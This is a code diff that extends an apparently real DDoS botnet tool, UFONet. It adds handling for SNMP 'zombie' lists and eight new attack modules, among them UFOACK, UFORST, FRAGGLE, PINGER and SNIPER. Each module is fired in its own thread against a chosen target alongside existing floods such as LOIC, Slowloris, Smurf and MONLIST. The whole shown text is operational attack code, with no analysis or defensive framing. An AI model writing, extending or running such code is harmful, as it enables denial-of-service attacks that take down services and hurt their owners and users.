+                print("[Info] [AI] [Control] Cannot open [SNMPs] from: 'botnet/snmp.txt' -> [Discarding!]")
+                return
+            else:
+                print("[Info] [AI] [Control] Cannot found [SNMPs] from: 'botnet/snmp.txt' [Discarding!]")
                 return
 
     def extract_zombies(self):
@@ -3899,6 +4246,19 @@ class UFONet(object):
                 for ntp in ntps_ready:
                     if ntp not in ntps_on_file: # parse possible repetitions
                         ntp_list.write(ntp + os.linesep)
+                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
+            f.close()
+
+    def update_snmps(self, snmps_ready):
+        # update snmps on file
+        options = self.options
+        if options.download or options.download_github: # append only new snmps to list
+            f = open(self.snmps_file)
+            snmps_on_file = f.read().splitlines()
+            with open(self.snmps_file, "a") as snmp_list:
+                for snmp in snmps_ready:
+                    if snmp not in snmps_on_file: # parse possible repetitions
+                        snmp_list.write(snmp + os.linesep)
                         self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
             f.close()
 
@@ -4466,7 +4826,7 @@ class UFONet(object):
         else:
             print("\n[Error] [AI] Target not valid: "+target+" -> [Discarding!]\n")
 
-    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon, monlist):
+    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, fraggle, xmas, ufoack, uforst, droper, overlap, pinger, ufoudp, nuke, tachyon, monlist, sniper):
         # perform some other extra attacks (such as DoS techniques)
         time.sleep(2) # aiming (multi-threading flow time compensation)
         if loic:
@@ -4580,6 +4940,102 @@ class UFONet(object):
             self.t9.daemon = True
             self.t9.start()
             self.update_monlist_stats() # add new MONLIST attack to mothership stats
+        if ufoack:
+            try:
+                self.options.ufoack = int(ufoack)
+            except:
+                self.options.ufoack = 101 # default UFOACK requests
+            if self.options.ufoack < 1:
+                self.options.ufoack = 101
+            self.instance = UFOACK() # instance main class for UFOACK operations
+            self.t10 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufoack)) # UFOACK using threads
+            self.t10.daemon = True
+            self.t10.start()
+            self.update_ufoack_stats() # add new UFOACK attack to mothership stats
+        if uforst:
+            try:
+                self.options.uforst = int(uforst)
+            except:
+                self.options.uforst = 101 # default UFORST requests
+            if self.options.uforst < 1:
+                self.options.uforst = 101
+            self.instance = UFORST() # instance main class for UFORST operations
+            self.t11 = threading.Thread(target=self.instance.attacking, args=(target, self.options.uforst)) # UFORST using threads
+            self.t11.daemon = True
+            self.t11.start()
+            self.update_uforst_stats() # add new UFORST attack to mothership stats
+        if droper:
+            try:
+                self.options.droper = int(droper)
+            except:
+                self.options.droper = 101 # default DROPER requests
+            if self.options.droper < 1:
+                self.options.droper = 101
+            self.instance = DROPER() # instance main class for DROPER operations
+            self.t12 = threading.Thread(target=self.instance.attacking, args=(target, self.options.droper)) # DROPER using threads
+            self.t12.daemon = True
+            self.t12.start()
+            self.update_droper_stats() # add new DROPER attack to mothership stats
+        if overlap:
+            try:
+                self.options.overlap = int(overlap)
+            except:
+                self.options.overlap = 101 # default OVERLAP requests
+            if self.options.overlap < 1:
+                self.options.overlap = 101
+            self.instance = OVERLAP() # instance main class for OVERLAP operations
+            self.t13 = threading.Thread(target=self.instance.attacking, args=(target, self.options.overlap)) # OVERLAP using threads
+            self.t13.daemon = True
+            self.t13.start()
+            self.update_overlap_stats() # add new OVERLAP attack to mothership stats
+        if pinger:
+            try:
+                self.options.pinger = int(pinger)
+            except:
+                self.options.pinger = 101 # default PINGER requests
+            if self.options.pinger < 1:
+                self.options.pinger = 101
+            self.instance = PINGER() # instance main class for PINGER operations
+            self.t14 = threading.Thread(target=self.instance.attacking, args=(target, self.options.pinger)) # PINGER using threads
+            self.t14.daemon = True
+            self.t14.start()
+            self.update_pinger_stats() # add new PINGER attack to mothership stats
+        if ufoudp:
+            try:
+                self.options.ufoudp = int(ufoudp)
+            except:
+                self.options.ufoudp = 101 # default UFOUDP requests
+            if self.options.ufoudp < 1:
+                self.options.ufoudp = 101
+            self.instance = UFOUDP() # instance main class for UFOUDP operations
+            self.t15 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ufoudp)) # UFOUDP using threads
+            self.t15.daemon = True
+            self.t15.start()
+            self.update_ufoudp_stats() # add new UFOUDP attack to mothership stats
+        if fraggle:
+            try:
+                self.options.fraggle = int(fraggle)
+            except:
+                self.options.fraggle = 101 # default FRAGGLE requests
+            if self.options.fraggle < 1:
+                self.options.fraggle = 101
+            self.instance = FRAGGLE() # instance main class for FRAGGLE operations
+            self.t16 = threading.Thread(target=self.instance.attacking, args=(target, self.options.fraggle)) # FRAGGLE using threads
+            self.t16.daemon = True
+            self.t16.start()
+            self.update_fraggle_stats() # add new FRAGGLE attack to mothership stats
+        if sniper:
+            try:
+                self.options.sniper = int(sniper)
+            except:
+                self.options.sniper = 101 # default SNIPER requests
+            if self.options.sniper < 1:
+                self.options.sniper = 101
+            self.instance = SNIPER() # instance main class for SNIPER operations
+            self.t17 = threading.Thread(target=self.instance.attacking, args=(target, self.options.sniper)) # SNIPER using threads
+            self.t17.daemon = True
+            self.t17.start()
+            self.update_sniper_stats() # add new SNIPER attack to mothership stats
 
     def stressing(self, target, zombie):
         # perform a DDoS Web attack against a target, requesting records on target's database
@@ -4818,8 +5274,8 @@ class UFONet(object):
                 num_hits = 0
                 num_zombie = 1
                 # start to attack the target with [MODS]
-                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.xmas or options.nuke or options.tachyon or options.monlist:
-                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.xmas, self.options.nuke, self.options.tachyon, self.options.monlist)) # multithreading flow for extra attacks
+                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.fraggle or options.xmas or options.ufoack or options.uforst or options.droper or options.overlap or options.pinger or options.ufoudp or options.nuke or options.tachyon or options.monlist or options.sniper:
+                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.fraggle, self.options.xmas, self.options.ufoack, self.options.uforst, self.options.droper, self.options.overlap, self.options.pinger, self.options.ufoudp, self.options.nuke, self.options.tachyon, self.options.monlist, self.options.sniper)) # multithreading flow for extra attacks
                     ex.daemon = True # extra weapons are threaded as daemons
                     ex.start()
                 # start to attack the target with [ARMY]
@@ -4923,6 +5379,22 @@ class UFONet(object):
                     self.t8.join()
                 if self.options.monlist:
                     self.t9.join()
+                if self.options.ufoack:
+                    self.t10.join()
+                if self.options.uforst:
+                    self.t11.join()
+                if self.options.droper:
+                    self.t12.join()
+                if self.options.overlap:
+                    self.t13.join()
+                if self.options.pinger:
+                    self.t14.join()
+                if self.options.ufoudp:
+                    self.t15.join()
+                if self.options.fraggle:
+                    self.t16.join()
+                if self.options.sniper:
+                    self.t17.join()
                 if self.options.target_list:
                     self.num_target_list = self.num_target_list - 1 # num_target_list = 0 provokes exit!
                 print ("\x1b[2J\x1b[H") # black magic
